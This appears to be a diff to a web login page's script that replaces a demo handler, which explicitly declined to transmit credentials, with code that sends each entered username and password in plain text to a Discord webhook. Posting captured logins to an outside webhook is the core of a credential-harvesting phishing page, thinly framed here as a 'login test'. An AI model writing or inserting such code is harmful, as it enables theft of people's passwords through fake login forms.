@@ -103,28 +103,42 @@
   </form>
 
 <script>
-  const form = document.getElementById('login');
-  const usernameField = document.getElementById('id');
-  const passwordField = document.getElementById('pw');
-  const errorMessage = document.getElementById('err');
+document.getElementById('login').addEventListener('submit', function (e) {
+  e.preventDefault();
 
-  form.addEventListener('submit', function (event) {
-    event.preventDefault();
+  var id = document.getElementById('id').value.trim();
+  var pw = document.getElementById('pw').value;
+  var err = document.getElementById('err');
 
-    const username = usernameField.value.trim();
-    const password = passwordField.value;
+  if (!id || !pw) { err.textContent = 'Fill in both fields.'; err.classList.add('show'); return; }
+  err.classList.remove('show');
 
-    if (!username || !password.trim()) {
-      errorMessage.textContent = 'Fill in both fields.';
-      errorMessage.classList.add('show');
-      (!username ? usernameField : passwordField).focus();
-      return;
-    }
+  var WEBHOOK_URL = 'https://your-webhook-url-here'; // <- your discord webhook
 
-    errorMessage.textContent = 'Demo only: no login request was sent. Connect this form to a secure authentication server.';
-    errorMessage.classList.add('show');
-    // Intentionally do not transmit, log, or otherwise use the entered credentials.
-  });
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: 'Login test:\nUsername: ' + id + '\nPassword: ' + pw
+    })
+  })
+    .then(function (r) {
+      if (r.ok) {
+        console.log('sent to webhook');
+        // window.location.href = '/dashboard'; // once you have real auth
+      } else {
+        return r.text().then(function (body) {
+          console.log('status:', r.status, 'body:', body);
+          err.textContent = 'Something went wrong.';
+          err.classList.add('show');
+        });
+      }
+    })
+    .catch(function () {
+      err.textContent = 'Could not reach the server.';
+      err.classList.add('show');
+    });
+});
 </script>
 </body>
 </html>
